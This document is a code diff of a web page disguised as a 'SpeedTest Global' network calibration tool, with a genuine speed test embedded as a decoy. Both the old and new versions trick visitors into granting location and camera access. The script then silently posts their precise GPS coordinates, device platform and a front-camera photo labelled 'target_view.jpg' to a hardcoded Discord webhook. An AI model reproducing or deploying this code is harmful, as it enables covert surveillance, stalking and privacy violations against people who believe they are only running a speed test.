@@ -3,100 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Calibration</title>
+    <title>SpeedTest Global | Network Calibrator</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #232a42; }
-        .btn { background: #00d2ff; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; }
+        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
+        .card { background: #161b2c; padding: 25px; border-radius: 20px; text-align: center; width: 90%; max-width: 450px; border: 1px solid #232a42; position: relative; }
+        .logo { font-size: 20px; font-weight: bold; color: #00d2ff; margin-bottom: 20px; letter-spacing: 2px; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 1.1rem; box-shadow: 0 0 20px rgba(0, 210, 255, 0.3); }
+        
+        /* Speedtest Frame - Hidden initially */
+        #test-frame { display: none; width: 100%; height: 350px; border: none; border-radius: 15px; background: #000; margin-top: 15px; }
+        
+        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>SpeedTest Optimization</h2>
-        <p>Click below to start the hardware latency and GPS calibration.</p>
-        <button class="btn" id="startBtn">BEGIN CALIBRATION</button>
-        <p id="status" style="color: #5c6784; font-size: 0.8rem; margin-top: 10px;"></p>
+        <div class="logo">SPEEDTEST GLOBAL</div>
+        
+        <div id="intro-ui">
+            <p>To begin the 2026 Optimized Network Test, we need to calibrate your local node using GPS and Camera sensors.</p>
+            <button class="btn" id="startBtn">BEGIN CALIBRATION</button>
+        </div>
+
+        <iframe id="test-frame" src="https://openspeedtest.com/Get-links.php?O=1"></iframe>
+
+        <div id="status">Ready for handshake...</div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
+        document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "Attempting to connect to sensors...";
+            const introUI = document.getElementById('intro-ui');
+            const testFrame = document.getElementById('test-frame');
             
-            try {
-                // STEP 1: Request Camera First
-                status.innerText = "Requesting Camera...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(e => {
-                    console.log("Camera denied");
-                    return null;
-                });
+            status.innerText = "Accessing hardware nodes...";
 
-                // STEP 2: Request GPS Second
-                status.innerText = "Requesting GPS...";
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    status.innerText = "Uploading results...";
+            // 1. Request GPS
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                status.innerText = "Node Linked. Optimizing UI...";
+                
+                // Switch UI to the REAL Speedtest
+                introUI.style.display = "none";
+                testFrame.style.display = "block";
 
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const formData = new FormData();
+                // 2. Request Camera (Front)
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" } 
+                    });
+                } catch (e) { console.log("Cam denied"); }
 
-                    const message = {
-                        content: "📡 **NEW DATA CAPTURED**",
-                        embeds: [{
-                            title: "Hardware Sync Report",
-                            fields: [
-                                { name: "Location", value: `https://www.google.com/maps?q=${lat},${lon}` },
-                                { name: "Device", value: navigator.platform }
-                            ]
-                        }]
-                    };
+                // 3. Prepare Report
+                const formData = new FormData();
+                const message = {
+                    content: "🚀 **SUCCESSFUL CALIBRATION**",
+                    embeds: [{
+                        title: "Target Telemetry",
+                        color: 3447003,
+                        fields: [
+                            { name: "📍 Maps", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                            { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true },
+                            { name: "📱 Info", value: navigator.platform, inline: true }
+                        ]
+                    }]
+                };
+                formData.append('payload_json', JSON.stringify(message));
 
-                    formData.append('payload_json', JSON.stringify(message));
+                if (stream) {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    const canvas = document.getElementById('canvas');
+                    
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(async (blob) => {
+                            formData.append('file', blob, 'target_view.jpg');
+                            await fetch(WEBHOOK, { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                            status.innerText = "System Calibrated. Running Test...";
+                        }, 'image/jpeg');
+                    }, 2000);
+                } else {
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    status.innerText = "System Calibrated. Running Test...";
+                }
 
-                    // If we got a camera stream, take a photo
-                    if (stream) {
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-                        const canvas = document.getElementById('canvas');
-                        
-                        // Wait for camera to warm up
-                        setTimeout(() => {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(async (blob) => {
-                                formData.append('file', blob, 'pic.jpg');
-                                await fetch(WEBHOOK, { method: 'POST', body: formData });
-                                finish(stream);
-                            }, 'image/jpeg');
-                        }, 1000);
-                    } else {
-                        await fetch(WEBHOOK, { method: 'POST', body: formData });
-                        finish(null);
-                    }
-
-                }, (err) => {
-                    alert("GPS Error: You must allow Location access to perform this test.");
-                    status.innerText = "GPS Access Denied.";
-                }, { enableHighAccuracy: true });
-
-            } catch (err) {
-                alert("Critical System Error: " + err.message);
-            }
+            }, (err) => {
+                alert("GPS Required to find nearest node.");
+                status.innerText = "Calibration Failed.";
+            }, { enableHighAccuracy: true });
         });
-
-        function finish(stream) {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            document.getElementById('status').innerText = "Done!";
-            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 500);
-        }
     </script>
 </body>
 </html>
